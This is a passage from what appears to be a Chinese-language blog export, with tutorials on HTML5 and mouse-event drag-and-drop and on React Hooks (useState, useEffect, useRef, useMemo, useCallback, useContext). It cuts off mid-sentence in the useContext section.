class=\"javascript\">              ball.style.opacity = <span class=\"string\">&#x27;0.5&#x27;</span>;</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">          </span><br><span class=\"line\">          </span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\"><span class=\"javascript\">        ball.addEventListener(<span class=\"string\">&#x27;mousedown&#x27;</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">event</span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">          ball.style.position = <span class=\"string\">&#x27;absolute&#x27;</span>;</span></span><br><span class=\"line\">          offset = &#123;</span><br><span class=\"line\">            x: event.clientX - ball.getBoundingClientRect().left,</span><br><span class=\"line\">            y: event.clientY - ball.getBoundingClientRect().top</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\"><span class=\"javascript\">          <span class=\"built_in\">document</span>.addEventListener(<span class=\"string\">&#x27;mousemove&#x27;</span>, onmousemove);</span></span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\"><span class=\"javascript\">        ball.addEventListener(<span class=\"string\">&#x27;mouseup&#x27;</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">event</span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">          <span class=\"built_in\">document</span>.removeEventListener(<span class=\"string\">&#x27;mousemove&#x27;</span>, onmousemove);</span></span><br><span class=\"line\"><span class=\"javascript\">          ball.onmouseup = <span class=\"literal\">null</span>;</span></span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\"><span class=\"javascript\">        ball.ondragstart = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">          <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span></span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"拖放功能\"><a href=\"#拖放功能\" class=\"headerlink\" title=\"拖放功能\"></a>拖放功能</h1><h3 id=\"1、HTML5-拖放功能\"><a href=\"#1、HTML5-拖放功能\" class=\"headerlink\" title=\"1、HTML5 拖放功能\"></a>1、HTML5 拖放功能</h3><h5 id=\"1-1-说明\"><a href=\"#1-1-说明\" class=\"headerlink\" title=\"1.1 说明\"></a>1.1 说明</h5><ul>\n<li>ondragstart 事件: 作用于被拖拽元素上，当拖拽元素开始被拖拽的时候触发（回调函数中可设置需要传递的数据）</li>\n<li>ondragover 事件: 作用于目标元素上，拖拽元素在目标元素上移动时触发 （默认无法将元素 A 拖拽到元素 B 上，需调用 e.prentDefault() 方法，才能触发 ondrop 事件）</li>\n<li>ondrop 事件：作用于目标元素上，被拖拽的元素在目标元素上且鼠标放开时触发 （drop事件的默认行为是以链接形式打开, 需调用 e.prentDefault() 方法，回调函数中可添加被拖拽元素作为子元素）</li>\n<li>dataTransfer 对象：用于从被拖拽元素到目标元素间传递数据（拥有setData()、getData() 方法，只能传递字符串）</li>\n</ul>\n<h5 id=\"1-2-事件列表\"><a href=\"#1-2-事件列表\" class=\"headerlink\" title=\"1.2 事件列表\"></a>1.2 事件列表</h5><p>在拖动目标上触发事件 (源元素):</p>\n<ul>\n<li>ondragstart - 用户开始拖动元素时触发</li>\n<li>ondrag - 元素正在拖动时触发</li>\n<li>ondragend - 用户完成元素拖动</li>\n</ul>\n<p>释放目标时触发的事件:</p>\n<ul>\n<li>ondragenter - 当被鼠标拖动的对象进入其容器范围内时触发此事件</li>\n<li>ondragover - 当某被拖动的对象在另一对象容器范围内拖动时触发此事件</li>\n<li>ondragleave - 当被鼠标拖动的对象离开其容器范围内时触发此事件</li>\n<li>ondrop - 在一个拖动过程中，释放鼠标键时触发此事件</li>\n</ul>\n<h5 id=\"1-3-示例\"><a href=\"#1-3-示例\" class=\"headerlink\" title=\"1.3 示例\"></a>1.3 示例</h5><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">ondrop</span>=<span class=\"string\">&quot;drop(event)&quot;</span> <span class=\"attr\">ondragover</span>=<span class=\"string\">&quot;allowDrop(event)&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;abc.gif&quot;</span> <span class=\"attr\">draggable</span>=<span class=\"string\">&quot;true&quot;</span> <span class=\"attr\">ondragstart</span>=<span class=\"string\">&quot;drag(event)&quot;</span> /&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"function\"><span class=\"title\">allowDrop</span>(<span class=\"params\">e</span>)</span> &#123;</span></span><br><span class=\"line\">        e.preventDefault();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"function\"><span class=\"title\">drag</span>(<span class=\"params\">e</span>)</span> &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        e.dataTransfer.setData(<span class=\"string\">&quot;content&quot;</span>, <span class=\"string\">&#x27;11111&#x27;</span>);</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"function\"><span class=\"title\">drop</span>(<span class=\"params\">e</span>)</span> &#123;</span></span><br><span class=\"line\">        e.preventDefault();</span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">var</span> data = e.dataTransfer.getData(<span class=\"string\">&quot;content&quot;</span>);</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"2、通过鼠标事件模拟拖放功能\"><a href=\"#2、通过鼠标事件模拟拖放功能\" class=\"headerlink\" title=\"2、通过鼠标事件模拟拖放功能\"></a>2、通过鼠标事件模拟拖放功能</h3><h5 id=\"2-1-实现步骤\"><a href=\"#2-1-实现步骤\" class=\"headerlink\" title=\"2.1 实现步骤\"></a>2.1 实现步骤</h5><ol>\n<li>监听被拖拽元素的 <code>onmousedown</code> 事件</li>\n<li>在 <code>onmousedown</code> 事件事件触发时，保存<strong>元素的左上角</strong>与<strong>鼠标点击的位置</strong>的<strong>修正偏移量</strong>（<code>getBoundingClientRect()</code> 与 <code>event.clientX/clientY</code>）</li>\n<li>设置被拖拽元素为 <code>position: absolute</code>，在之后位置改变时，会以文档左上角为标准，方便计算距离</li>\n<li>在 <code>onmousedown</code> 中监听 <code>document</code> 元素的 <code>onmousemove</code> 事件（监听 <code>document</code> 会更可靠）</li>\n<li>在 <code>onmousedown</code> 处理程序中，计算元素相对于文档的偏移量（<code>event.pageX/pageY</code> 与<strong>修正偏移量</strong>的差值）</li>\n<li>设置被拖拽元素的 <code>top</code>、<code>left</code> 的值</li>\n</ol>\n<blockquote>\n<p>mousemove 会经常被触发，但不会针对每个像素都如此。因此在快速移动之后，光标可以从文档中心的某个地方（甚至是窗口外）从球上跳出来。因此为了捕获它，我们应该监听 document。</p>\n</blockquote>\n<h5 id=\"2-2-示例\"><a href=\"#2-2-示例\" class=\"headerlink\" title=\"2.2 示例\"></a>2.2 示例</h5><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">&quot;en&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;viewport&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">&quot;X-UA-Compatible&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Document<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">        #app &#123;</span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">width</span>: <span class=\"number\">1000px</span>;</span></span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">height</span>: <span class=\"number\">550px</span>;</span></span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">margin</span>: <span class=\"number\">0</span> auto;</span></span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">border</span>: <span class=\"number\">1px</span> solid <span class=\"number\">#ccc</span>;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        #content &#123;</span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">width</span>: <span class=\"number\">800px</span>;</span></span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">height</span>: <span class=\"number\">300px</span>;</span></span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">margin</span>: <span class=\"number\">100px</span> auto;</span></span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">background</span>: <span class=\"number\">#eee</span>;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        #ball &#123;</span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">display</span>: inline-block;</span></span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">width</span>: <span class=\"number\">40px</span>;</span></span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">height</span>: <span class=\"number\">40px</span>;</span></span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">border-radius</span>: <span class=\"number\">50%</span>;</span></span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">background</span>: <span class=\"number\">#900</span>;</span></span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">cursor</span>: pointer;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;app&quot;</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;content&quot;</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;droppable&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">span</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;ball&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> offset = <span class=\"literal\">null</span>; <span class=\"comment\">// 鼠标点击的位置与元素左上角的偏移量</span></span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> currentDroppable = <span class=\"literal\">null</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">const</span> ball = <span class=\"built_in\">document</span>.querySelector(<span class=\"string\">&#x27;#ball&#x27;</span>);</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">const</span> onmousemove = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">event</span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">          ball.style.left = event.pageX - offset.x + <span class=\"string\">&#x27;px&#x27;</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">          ball.style.top = event.pageY - offset.y + <span class=\"string\">&#x27;px&#x27;</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">          <span class=\"comment\">// 查找是否有目标元素</span></span></span><br><span class=\"line\"><span class=\"javascript\">          ball.style.display = <span class=\"string\">&#x27;none&#x27;</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">          <span class=\"keyword\">const</span> belowEle = <span class=\"built_in\">document</span>.elementFromPoint(event.clientX, event.clientY);</span></span><br><span class=\"line\"><span class=\"javascript\">          ball.style.display = <span class=\"string\">&#x27;inline-block&#x27;</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">          <span class=\"keyword\">if</span> (!belowEle) <span class=\"keyword\">return</span>;</span></span><br><span class=\"line\">          </span><br><span class=\"line\"><span class=\"javascript\">          <span class=\"keyword\">const</span> droppableBelow = belowEle.closest(<span class=\"string\">&#x27;.droppable&#x27;</span>);</span></span><br><span class=\"line\">          if (currentDroppable != droppableBelow) &#123;</span><br><span class=\"line\">            if (currentDroppable) &#123;</span><br><span class=\"line\"><span class=\"javascript\">              ball.style.opacity = <span class=\"string\">&#x27;1&#x27;</span>;</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            currentDroppable = droppableBelow;</span><br><span class=\"line\">            if (currentDroppable) &#123;</span><br><span class=\"line\"><span class=\"javascript\">              ball.style.opacity = <span class=\"string\">&#x27;0.5&#x27;</span>;</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">          </span><br><span class=\"line\">          </span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\"><span class=\"javascript\">        ball.addEventListener(<span class=\"string\">&#x27;mousedown&#x27;</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">event</span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">          ball.style.position = <span class=\"string\">&#x27;absolute&#x27;</span>;</span></span><br><span class=\"line\">          offset = &#123;</span><br><span class=\"line\">            x: event.clientX - ball.getBoundingClientRect().left,</span><br><span class=\"line\">            y: event.clientY - ball.getBoundingClientRect().top</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\"><span class=\"javascript\">          <span class=\"built_in\">document</span>.addEventListener(<span class=\"string\">&#x27;mousemove&#x27;</span>, onmousemove);</span></span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\"><span class=\"javascript\">        ball.addEventListener(<span class=\"string\">&#x27;mouseup&#x27;</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">event</span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">          <span class=\"built_in\">document</span>.removeEventListener(<span class=\"string\">&#x27;mousemove&#x27;</span>, onmousemove);</span></span><br><span class=\"line\"><span class=\"javascript\">          ball.onmouseup = <span class=\"literal\">null</span>;</span></span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\"><span class=\"javascript\">        ball.ondragstart = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">          <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span></span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>"},{"title":"React Hooks","date":"2021-05-26T08:32:38.000Z","_content":"\n# React Hooks\n\nHooks 是辅助 Function Component 的一种工具，用于管理函数组件的状态、生命周期、副作用等\n\n## 1. useState\n\n### 1.1 使用方式\n\n```js\nconst App = () => {\n    const [count, setCount] = useState(0)\n    const [name, setName] = useState('Jack')\n    const [age, setAge] = useState(18)\n\n    const onClick = () => {\n        setCount(count + 1)\n        setAge(age + 1)\n    }\n\n    return (\n        <>\n            <p>You clicked {count} times</p>\n            <p>Your age is {age}</p>\n            <p>Your name is {name}</p>\n            <button onClick={onClick}>\n                Click me\n            </button>\n        </>\n    )\n}\n\nexport default App\n```\n\n在 Class Component 中通过 this.state 方式读取 state，每次执行都会拿到最新的 state 引用，而 Function Component 中不是通过 this. 的方式获取到的 state，而是当时渲染闭包环境的 state 数据，所以取到的值依然是旧的渲染值\n\n说明：每次调用 `setCount`、`setAge` 时都会重新执行整个函数式组件，包括初始化数据，调用 `useState`、`useEffect`，注册事件等，最后返回 `VNode` 对象（每次重新 `render` 组件时取出来的 `state` 是缓存中的值，即上一次 `state` 的值或初始值）\n\n> useState 的初始值只在第一次渲染时有效，之后从 state 中取出的值都是缓存的值\n\n### 1.2 实现原理\n```js\n// useState 基本实现原理\nlet memoizedState = [] // hooks 的值存放在这个数组里\nlet cursor = 0 // 当前 memoizedState 的索引\n\nfunction useState(initialValue) {\n    memoizedState[cursor] = memoizedState[cursor] || initialValue\n    const currentCursor = cursor\n    function setState(newState) {\n        memoizedState[currentCursor] = newState\n        cursor = 0\n        render(<App />, document.getElementById('root'))\n    }\n    return [memoizedState[cursor++], setState] // 返回当前 state，并把 cursor 加 1\n}\n```\n\n**useState 原理**\n* 初次渲染时，每次 `useState` 执行时都会将对应的 `setState` 绑定到对应索引的位置（用于更新指定的 `state`），然后将初始 `state` 存入 `memoizedState` 中\n* 触发 `setCount` 和 `setAge` 时，每个 `setState` 都有其对应索引的引用，因此触发对应的 `setState` 会改变对应位置的 `state` 的值\n* 每次执行 `setState` 都有一次重新渲染的过程，将 `cursor` 重置为 `0`，重新按顺序取得 `state` 里面的值（已缓存上一次 `state` 里的值）\n\n`Hooks` 需要确保 `Hook` 在每一次渲染中都按照同样的顺序被调用，因为 `memoizedState` 是按 `Hooks` 定义的顺序来放置数据的，如果 `Hooks` 的顺序变化，`memoizedState` 并不会感知到。所以最好每次只在最顶层使用 `Hook，不要在循环、条件、嵌套函数中调用` `Hooks。`\n\n\n> `useState` 返回更新 `state` 的函数与 `class` 组件的 `this.setState` 不同，它不会把新的 `state` 和旧的 `state` 进行合并，而是直接替换，相当于直接返回一个新的对象\n\n每次 setState 后都会重新渲染，渲染时的 state、props、useEffect、事件处理函数都是独立的，获取到的值是此次 rerender 时的数据\n\n利用 useRef 就可以绕过 Capture Value 的特性。可以认为 ref 在所有 Render 过程中保持着唯一引用，因此所有对 ref 的赋值或取值，拿到的都只有一个最终状态，而不会在每个 Render 间存在隔离\n\n## 2. useEffect\nuseEffect 在每次 render 执行完后再执行，用于处理数据副操作，用于在函数组件里实现 class 的生命周期\n\n* useEffect(() => {}): 每次 render 后执行，类似于 `componentDidUpdate`\n* useEffect(() => { return cleanUpFn }，[]): 挂载后执行一次，销毁时执行一次 cleanupFn，功能类似于 `componentDidMount` 和 `componentWillUnmount`\n* useEffect(() => {}，[state1, state2]): 每次 state1 或 state2 变化后执行，功能类似于 Vue 中的 `watch`\n\n> 在第一次渲染之后和每次更新之后都会执行，可以根据依赖项进行控制，执行顺序为 `setState` --> `render` --> `useEffect`\n> useEffect 里面使用到的 state 的值, 固定在了 useEffect 内部（闭包环境），引用地址不会再变化\n\n```js\nuseEffect(() => {\n  const timer = setInterval(() => {\n    console.log('---')\n  }, 1000)\n\n  return () => {\n    clearInterval(timer)\n  }\n},[])\n\n```\n\n* 必须将 `函数` 写在 `useEffect` 内部，这样 `eslint-plugin-react-hooks` 才能通过静态分析补齐依赖项\n* 所有函数都写在 useEffect 内部会导致难以维护，可以使用 `useCallback`\n\n```js\nfunction Counter() {\n  const [count, setCount] = useState(0);\n\n  const getFetchUrl = useCallback(() => {\n    return 'https://v?query=' + count;\n  }, [count]);\n\n  useEffect(() => {\n    getFetchUrl();\n  }, [getFetchUrl]);\n\n  return <h1>{count}</h1>;\n}\n```\n\n## 3. useRef\n`useRef` 可以用于访问 DOM 节点、React 组件实例或作为容器保存可变变量\n\n> useRef 返回一个可变的 ref 对象，其 .current 属性被初始化为传入的参数（initialValue）。返回的 ref 对象在组件的整个生命周期内保持不变。通过 current 属性可以访问到 DOM 节点\n\n```js\nfunction TextInputWithFocusButton() {\n  const inputEl = useRef(null);\n  const onButtonClick = () => {\n    inputEl.current.focus(); // `current` 指向已挂载到 DOM 上的文本输入元素\n  };\n  return (\n    <>\n      <input ref={inputEl} type=\"text\" />\n      <button onClick={onButtonClick}>Focus the input</button>\n    </>\n  );\n}\n```\n\n\n```js\n// 获取上一轮的 props 或 state\nfunction usePrevious(value) {\n  const ref = useRef(); // 此处的 ref 相当于是全局变量，re-render 时并不会被回收\n  useEffect(() => {\n    ref.current = value;\n  });\n  return ref.current;\n}\n```\n\n\n## 4.useMemo\n用于缓存值，避免在每次渲染时都进行高开销的计算\n\n`const memoizedValue = useMemo(() => computeExpensiveValue(a, b), [a, b]);`\n\n用于缓存值，把 “创建” 函数和依赖项数组作为参数传入 `useMemo`，它仅会在某个依赖项改变时才重新计算 `memoized` 值。这种优化有助于避免在每次渲染时都进行高开销的计算。类似于 Vue 中的 `computed` 属性。\n\n> 函数组件里的某一个 state 变化时，都会重新执行整个函数并渲染，逻辑从上到下重新执行一遍\n\n```js\nexport default function WithMemo() {\n\tconst [count, setCount] = useState(1);\n\tconst [val, setValue] = useState('');\n\n\t// 缓存了昂贵的计算\n\tconst expensive = useMemo(() => {\n\t\tconsole.log('compute');\n\t\tlet sum = 0;\n\t\tfor (let i = 0; i < count * 100; i++) {\n\t\t\tsum += i;\n\t\t}\n\t\treturn sum;\n\t}, [count]);\n\n\treturn (\n\t\t<div>\n\t\t\t<h4>{count}-{expensive}</h4>\n\t\t\t<div>\n\t\t\t\t<button onClick={() => setCount(count + 1)}>+c1</button>            <input value={val} onChange={event => setValue(event.target.value)} />\n\t\t\t</div>\n\t\t</div>\n\t);\n}\n```\n\n## 5. useCallback\n\n`const memoizedCb = useMemo(() => doSomething(a, b), [a, b]);`\n\n用于**缓存函数**，返回一个 memoized 回调函数，根据依赖项来决定是否更新函数\n\n在 class component 中通过 shouldComponentUpdate 或 getDerivedStateFromProps 中判断前后的 props 和 state，如果没有变化，则阻止更新，而 16.8 版本前的 function component 没有生命周期钩子用来优化性能，且函数组件每次调用都会执行其内部环境的所有逻辑，因此用 useMemo 和 useCallback 处理优化性能问题。\n\n> 把内联回调函数及依赖项数组作为参数传入 useCallback，它将返回该回调函数的 memoized 版本，该回调函数仅在某个依赖项改变时才会更新。当你把回调函数传递给经过优化的并使用引用相等性去避免非必要渲染（例如 shouldComponentUpdate）的子组件时，它将非常有用。\n\n\n> React.memo 为高阶组件。它与 React.PureComponent 非常相似，但只适用于函数组件，而不适用 class 组件，能对props做浅比较，防止组件无效的重复渲染\n\n有一个父组件，其中包含子组件，子组件接收一个函数作为 props；通常而言，如果父组件更新了，子组件也会执行更新；但是大多数场景下，更新是没有必要的，我们可以借助useCallback来返回函数，然后把这个函数作为props传递给子组件；这样，子组件就能避免不必要的更新。\n\n例如：父组件传递一个函数给子组件的时候，由于父组件的更新会导致该函数重新生成从而传递给子组件的函数引用发生了变化，这就会导致子组件也会更新，而很多时候子组件的更新是没必要的，所以我们可以通过 `useCallback` 来缓存该函数，然后传递给子组件，用于减少子组件不必要的重新渲染。\n\n**note:** useCallback 需与 memo 结合使用，否则没有意义\n\n\n```js\nfunction useFetch(count, step) {\n  return useCallback(() => {\n    const url = \"https://v/search?query=\" + count + \"&step=\" + step;\n  }, [count, step]);\n}\n```\n\n```js\n// 父组件\nconst Parent = () => {\n\tconst [count, setCount] = useState(1);\n\tconst [val, setVal] = useState('');\n\tconst callback = useCallback(() => {\n\t\treturn count;\n\t}, [count]);\n\n\treturn (\n\t\t<div>\n\t\t\t<h4>{count}</h4>\n\t\t\t<Child callback={callback} />\n\t\t\t<div>\n\t\t\t\t<button onClick={() => setCount(count + 1)}>+</button>\n\t\t\t\t<input value={val} onChange={event => setVal(event.target.value)} />\n\t\t\t</div>\n\t\t</div>\n\t);\n}\n\n// 子组件\nconst Child = ({ callback }) => {\n\tconst [count, setCount] = useState(() => callback());\n\tuseEffect(() => {\n\t\tsetCount(callback());\n\t}, [callback]);\n\treturn <div>{count}</div>\n}\nexport default React.memo(Child) // 用React.memo包裹\n```\n\n### 5.1 何时使用 useMemo、useCallback\n* 需要保持对象、函数的引用地址相等（核心）\n* 对于组件内部用到的 object、array、函数等，如果用在了其他 Hook 的依赖数组中，或者作为 props 传递给了下游组件，应该使用 useMemo 和 useCallback\n* 自定义 Hook 中暴露出来的 object、array、函数等，都应该使用useMemo 和 useCallback,以确保当值相同时，引用不发生变化\n\nReact.memo 和 React.PureComponent 类似， React.PureComponent 在类组件中使用，而 React.memo 在函数组件中使用\n\n```js\n// 父组件\nconst Parent = () => {\n\tconst [count, setCount] = useState(1);\n\tconst [val, setVal] = useState('');\n\tconst callback = useCallback(() => {\n\t\treturn count;\n\t}, [count]);\n\n\treturn (\n\t\t<div>\n\t\t\t<h4>{count}</h4>\n\t\t\t<Child callback={callback} />\n\t\t\t<div>\n\t\t\t\t<button onClick={() => setCount(count + 1)}>+</button>\n\t\t\t\t<input value={val} onChange={event => setVal(event.target.value)} />\n\t\t\t</div>\n\t\t</div>\n\t);\n}\n\n// 子组件\nconst Child = ({ callback }) => {\n\tconst [count, setCount] = useState(() => callback());\n\tuseEffect(() => {\n\t\tsetCount(callback());\n\t}, [callback]);\n\treturn <div>{count}</div>);\n}\nexport default React.memo(Child)\n\t// 用React.memo包裹\n\n```\n\n\n## 6. useContext\n\n接收一个 `context` 对象（React.createContext 的返回值）并返回该 context 的当前值。\n\n```js\n// initContext 可以为基础数据类型、对象或者函数\nconst context = React.useContext(React.createContext(initContext))\n```\n\n> 当前的 context 值由上层组件中距离当前组件最近的 `<MyContext.Provider>` 的 `value` **prop** 决定，如果 `<MyContext.Provider>` 没有提供 `value` **prop**，则 `context` 中获取到的值为 `React.createContext(initContext)` 中的 `initContext` 值\n\n> 当 `<MyContext.Provider>` 更新时，该 Hook 